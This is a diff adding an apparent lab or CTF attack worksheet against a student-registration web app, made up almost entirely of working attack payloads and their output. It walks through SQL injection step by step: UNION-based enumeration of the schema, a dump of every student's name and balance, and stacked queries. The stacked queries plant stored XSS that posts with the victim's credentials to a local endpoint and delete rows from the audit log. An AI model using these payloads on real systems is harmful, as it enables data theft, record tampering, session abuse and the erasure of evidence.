@@ -1,0 +1,117 @@
+Attacker 
+9900001 
+reg-isha-29 
+isha.sen 
+chat-Isha-29
+
+Victim 
+9900002 
+reg-fahim-29 
+fahim.mirza 
+chat-Fahim-29
+
+
+Student	Balance Due
+Isha Sen	$315.50
+
+reg-isha-29' and '1'='1
+reg-isha-29' and '1'='0
+
+reg-isha-29' order by 5 limit 1 -- -
+
+' union select 1,2,3,4,5 -- -
+
+Student	Balance Due
+3 4	$5.00
+
+database()
+c1_registration
+
+' union select 1,2,'',group_concat(table_name),5 from information_schema.tables where table_schema = database() -- -
+
+ log,registration
+
+' union select 1,2,'',group_concat(column_name),5 from information_schema.columns where table_name = 'log' -- -
+
+attempted_at,id,submitted_id,submitted_secret
+
+' union select 1,2,'',group_concat(column_name),5 from information_schema.columns where table_name = 'registration' -- -
+
+balance_due,first_name,last_name,reg_pin,student_id
+
+' union select 1,2,'',group_concat(student_id,': ',first_name,' ',last_name,'- $', balance_due, '<br>'),5 from registration -- -
+
+9900001: Isha Sen- $315.50
+,9900002: Fahim Mirza- $880.00
+,9900003: Jannat Ara- $0.00
+,9900004: Shadman Ali- $1240.75
+,9900005: Rukaiya Binte- $99.99
+,9900006: Sakib Morshed- $450.25
+,9900007: Antora Paul- $760.00
+,9900008: Mashrur Rahim- $150.50
+,9900009: Arin Sarker- $1999.00
+,9900010: Nahin Ahmed- $540.40
+,9900011: Sanjida Hossain- $25.00
+,9900012: Ridwan Kabir- $675.65
+,9900013: Joana Gomes- $300.00
+,9900014: Muhtasim Haque- $1080.10
+,9900015: Adhora Khan- $210.20
+
+reg-isha-29'; update registration set last_name = '<b>Sen</b>' where student_id = 9900001; -- -
+
+fetch:
+
+
+await fetch("http://localhost:3001/send", {
+    "credentials": "include",
+    "headers": {
+        "Content-Type": "application/x-www-form-urlencoded",
+    },
+    "body": "message=hello",
+    "method": "POST",
+});
+
+<script>document.title='C1-SECOND-ORDER-XSS'<\/script>
+
+reg-isha-29'
+update registration set last_name = 
+concat(
+    '<script>
+        fetch("http://localhost:3001/send", 
+            {
+                "credentials": "include",
+                "headers": {
+                    "Content-Type": "application/x-www-form-urlencoded",
+                },
+                "body": "message=%3Cscript%3Edocument.title%3D"'C1-SECOND-ORDER-XSS'"%3C%2Fscript%3E",
+                "method": "POST",
+            }
+        );
+    </script>'
+) where student_id = 9900001;
+-- -
+
+
+
+const link = "<script>document.title='C1-SECOND-ORDER-XSS'</script>";
+const message = link;
+const body = "message=" + encodeURIComponent(message);
+console.log(body);   // ← copy this exact string for your SQL payload
+
+%3Cscript%3Edocument.title%3D'C1-SECOND-ORDER-XSS'%3C%2Fscript%3E
+
+
+reg-isha-29'; UPDATE registration SET last_name = '<script>fetch("http://localhost:3001/send",{method:"POST",credentials:"include",headers:{"Content-Type":"application/x-www-form-urlencoded"},body:"message%3Cscript%3Edocument.title%3D%27C1-SECOND-ORDER-XSS%27%3C%2Fscript%3E"});</script>' WHERE student_id = 9900001; -- -
+
+
+reg-isha-29'; DELETE FROM log WHERE submitted_id = '9900001'; -- -
+
+import urllib.parse
+
+script = "<script>document.title='C1-SECOND-ORDER-XSS'</script>"
+encoded = urllib.parse.quote(script, safe='')  # safe='' মানে সব ক্যারেক্টার এনকোড করো
+
+print(encoded)
+
+
+%3Cscript%3Edocument.title%3D%27C1-SECOND-ORDER-XSS%27%3C%2Fscript%3E
